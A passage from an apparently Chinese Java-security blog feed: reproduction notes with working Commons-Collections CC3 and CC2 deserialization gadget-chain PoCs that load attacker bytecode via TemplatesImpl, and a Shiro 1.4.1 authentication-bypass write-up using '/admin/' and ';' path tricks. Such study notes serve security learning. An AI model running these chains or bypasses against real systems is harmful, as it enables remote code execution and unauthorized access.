class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>        setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>        setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-comment">// 后续就调用transform</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-comment">// 传入一个动态代理对象，就会调用这个动态代理对象的get方法 --&gt; 这个动态代理对象是我们上面的lazymap</span><br>        Constructor&lt;?&gt; aClassDeclaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>        aClassDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) aClassDeclaredConstructor.newInstance(Override.class, decorateMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">// 创建对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">aObejct</span> <span class="hljs-operator">=</span> aClassDeclaredConstructor.newInstance(Target.class, proxyMap);<br>        <span class="hljs-comment">// 执行反序列化</span><br><span class="hljs-comment">//        SerializeUtil.serialize(aObejct);</span><br>        SerializeUtil.unSerialize();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(templates, value);<br>    &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cc2调用链</title>
    <link href="/2024/05/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/cc%E9%93%BE/cc2%E8%B0%83%E7%94%A8%E9%93%BE/"/>
    <url>/2024/05/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/cc%E9%93%BE/cc2%E8%B0%83%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h1><ul><li>Commons-Collections 4.0</li><li>jdk8u65</li></ul><p>maven中导入坐标：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="CC2链分析："><a href="#CC2链分析：" class="headerlink" title="CC2链分析："></a>CC2链分析：</h1><p>首先分析这条链子，要先明白它存在的意义。</p><p>cc2实际上是基于cc4的。</p><p><img src="/../../../blog_image/image-20240331140734969.png" alt="image-20240331140734969"></p><p>其实本人在cc2中无意中编写类似cc2的代码，cc2主要是调用了<code>newTransformer</code>方法，而不是调用<code>TrAXFilter</code>方法。</p><p>poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    Transformer[] transformers = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>            <span class="hljs-comment">// 然后调用它的newTransformer()方法</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;)<br>    &#125;;<br><br>    ChainedTransformer&lt;Object&gt; chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br>    <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;());<br><br>    <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>    priorityQueue.add(<span class="hljs-number">1</span>);<br>    priorityQueue.add(<span class="hljs-number">1</span>);<br><br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TransformingComparator</span>&gt; transformingComparatorClass = transformingComparator.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">transformingComparatorClassDeclaredField</span> <span class="hljs-operator">=</span> transformingComparatorClass.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>    transformingComparatorClassDeclaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    transformingComparatorClassDeclaredField.set(transformingComparator,chainedTransformer);<br><br>    SerializeUtil.serialize(priorityQueue);<br>    SerializeUtil.unSerialize();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(templates, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>对于一些情况下，序列化时不能传入数组，如shiro反序列化中重写的序列化的方式，我们传入<code>Transformer</code>是不能序列化的。</p><p>因此我们需要改写以下，使用<code>InvokerTransformer</code>构造方法，调用他的<code>transform</code>方法，从而调用<code>newTransformer</code>方法。这<code>add</code>方法中就是间接调用了<code>transform</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>    <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br>    <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>    priorityQueue.add(templates);<br>    priorityQueue.add(templates);<br><br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TransformingComparator</span>&gt; transformingComparatorClass = transformingComparator.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">transformingComparatorClassDeclaredField</span> <span class="hljs-operator">=</span> transformingComparatorClass.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>    transformingComparatorClassDeclaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    transformingComparatorClassDeclaredField.set(transformingComparator,invokerTransformer);<br><br>    SerializeUtil.serialize(priorityQueue);<br>    SerializeUtil.unSerialize();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(templates, value);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shiro-未授权</title>
    <link href="/2024/05/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/shiro/shiro-%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
    <url>/2024/05/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/shiro/shiro-%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="shiro-1-4-1"><a href="#shiro-1-4-1" class="headerlink" title="shiro 1.4.1"></a>shiro 1.4.1</h1><p>简述：主要是通过<code>/请求路径/</code>即可实现bypass，越权访问。</p><p>适用范围：</p><p>版本&lt;&#x3D;1.4.1</p><p>poc：</p><table><thead><tr><th align="center">shiro配置</th><th align="center">请求资源路径</th><th align="center">bypass路径</th><th>说明</th></tr></thead><tbody><tr><td align="center">map.put(“&#x2F;admin”,”auth”)</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;admin&#x2F;</td><td><code>/admin</code>路径需要登陆才可以访问，但是使用<code>/admin/</code>可以绕过，因为shiro匹配不到<code>/admin/</code>，但是sb可以将末尾的<code>/</code>去掉。</td></tr><tr><td align="center">map.put(“&#x2F;admin&#x2F;**”,”auth”)</td><td align="center">&#x2F;admin&#x2F;page</td><td align="center">&#x2F;admin;&#x2F;page</td><td><code>/admin/**/</code>正常匹配这个路径是登录，但是shiro处理<code>;</code>会把<code>;</code>后的路径都去除，即变成<code>/admin</code>因此匹配不到<code>/admin/**</code>，sb则会去除多余<code>;</code>变成<code>/admin/page</code>正常访问。</td></tr></tbody></table><h2 id="1-环境搭建："><a href="#1-环境搭建：" class="headerlink" title="1. 环境搭建："></a>1. 环境搭建：</h2><p>目录如下：</p><p><img src="/../../../blog_image/image-20240312135436085-1716860764045-33.png" alt="image-20240312135436085"></p><p>标准的springboot环境，依赖如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>       <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>       <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>       <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>config配置如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hme.config;<br><br><span class="hljs-keyword">import</span> com.hme.realm.Realm;<br><span class="hljs-keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;<br><span class="hljs-keyword">import</span> org.apache.shiro.spring.web.config.DefaultShiroFilterChainDefinition;<br><span class="hljs-keyword">import</span> org.apache.shiro.spring.web.config.ShiroFilterChainDefinition;<br><span class="hljs-keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-keyword">import</span> java.util.LinkedHashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShiroConfig</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    Realm <span class="hljs-title function_">realm</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Realm</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    DefaultWebSecurityManager <span class="hljs-title function_">defaultWebSecurityManager</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;realm&quot;)</span> Realm realm)</span> &#123;<br>        <span class="hljs-type">DefaultWebSecurityManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultWebSecurityManager</span>();<br>        manager.setRealm(realm);<br>        <span class="hljs-keyword">return</span> manager;<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    ShiroFilterFactoryBean <span class="hljs-title function_">shiroFilterFactoryBean</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;defaultWebSecurityManager&quot;)</span> DefaultWebSecurityManager securityManager)</span>&#123;<br>        <span class="hljs-type">ShiroFilterFactoryBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShiroFilterFactoryBean</span>();<br>        bean.setSecurityManager(securityManager);<br>        bean.setLoginUrl(<span class="hljs-string">&quot;/login&quot;</span>);<br>        bean.setSuccessUrl(<span class="hljs-string">&quot;/index&quot;</span>);<br>        bean.setUnauthorizedUrl(<span class="hljs-string">&quot;/unauthorizedurl&quot;</span>);<br>        Map&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;/doLogin&quot;</span>, <span class="hljs-string">&quot;anon&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;/admin/**&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>);<br>        bean.setFilterChainDefinitionMap(map);<br>        <span class="hljs-keyword">return</span> bean;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要自定义了relam，然后配置拦截路径，其中</p><blockquote><p><code>/admin/**</code>路径的是<code>authc</code>需要登录才可以访问的。</p><p><code>/doLogin</code>是匿名访问的。</p><p>设置了登录重定向的路径为<code>/login</code></p><p>设置了登陆成功路径为<code>/index</code></p></blockquote><h2 id="2-复现过程："><a href="#2-复现过程：" class="headerlink" title="2. 复现过程："></a>2. 复现过程：</h2><p>当直接访问<code>/admin</code>需要进行登录：</p><p><img src="/../../../blog_image/image-20240312140028231-1716860764045-34.png" alt="image-20240312140028231"></p><p>请求<code>/doLogin?username=pow1e&amp;password=123456</code>登录后再次访问后即可访问<code>/admin</code></p><p><img src="/../../../blog_image/image-20240312140157400-1716860764045-35.png" alt="image-20240312140157400"></p><p>抓包：</p><p>讲cookie删除后是不会访问成功的</p><p><img src="/../../../blog_image/image-20240312140237706-1716860764045-36.png" alt="image-20240312140237706"></p><p>访问<code>/admin/</code>，在需要越权的路径后添加<code>/</code>即可越权成功。</p><p><img src="/../../../blog_image/image-20240312140327150-1716860764045-37.png" alt="image-20240312140327150"></p><h2 id="3-漏洞分析："><a href="#3-漏洞分析：" class="headerlink" title="3.漏洞分析："></a>3.漏洞分析：</h2><p><img src="/../../../blog_image/image-20240312151145191-1716860764045-38.png" alt="image-20240312151145191"></p><p>这里的<code>filterChainManager.getChainNames()</code>获取到的是shiro中鉴权的路径</p><p><img src="/../../../blog_image/image-20240312151432310-1716860764045-39.png" alt="image-20240312151432310"></p><p>而这里的requestURI是servlet中获取到的uri：</p><p><img src="/../../../blog_image/image-20240312151521127-1716860764045-40.png" alt="image-20240312151521127"></p><p>由于需要鉴权的<code>/admin</code>在这里匹配不到返回了null，然后进入Spring-Web的DispatcherServlet中，在DispatcherServlet的doDispatch方法中获取Handler：</p><p><img src="/../../../blog_image/image-20240312151846609-1716860764045-41.png" alt="image-20240312151846609"></p><p>调用getHandler获取handler，后续在<code>PathPattern#match</code>方法中对<code>/admin/list/</code>和 <code>/admin/list</code>的匹配都会返回 true。</p><p>查看资料还看到存在另一个poc，<code>decodeAndCleanUriString</code>方法，主要是截取uri中的<code>;</code>号，判断是否存在，如果是不为-1(存在)则会截取当前uri的第0当前截取到的<code>&#39;;&#39;</code>索引对应的下标位置，如果不存在<code>;</code>则直接返回原uri。</p><p>就是说<code>/abc;/admin</code>会被shiro处理成<code>/abc</code></p><p><code>/abc</code>则会处理成<code>/abc</code></p><p>假如shiro中需要鉴权的路径为<code>/admin</code>，请求的路径为<code>/xxx;/admin</code>，就会被shiro处理成<code>/xxx</code>然后进去匹配当前路径是否需要鉴权，但是只有<code>/admin</code>才需要鉴权，所以就绕过了shiro的鉴权。</p><p>shiro处理<code>/abc;/admin</code></p><p><img src="/../../../blog_image/image-20240312153255059-1716860764045-42.png" alt="image-20240312153255059"></p><p>返回的路径是<code>/abc</code></p><p><img src="/../../../blog_image/image-20240312153139709-1716860764045-43.png" alt="image-20240312153139709"></p><p>到springboot中会当前uri进行处理的结果是<code>/abc/admin</code></p><p><img src="/../../../blog_image/image-20240312153813074-1716860764045-44.png" alt="image-20240312153813074"></p><p>所以在shiro1.4.0，shiro拦截中写的是<code>/admin/*</code>，正常是访问<code>/admin/page</code>会被拦截的，但是使用<code>;</code>分号阻隔，shiro会处理成<code>/admin</code>，则会绕过<code>/admin/*</code>的匹配规则，而springboot则会处理成<code>/admin/page</code>。</p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>中间件</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>shiro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 反序列化基础四(1.2.68)</title>
    <link href="/2024/05/01/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/fastjson/fastjson%201268/"/>
    <url>/2024/05/01/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/fastjson/fastjson%201268/</url>
    
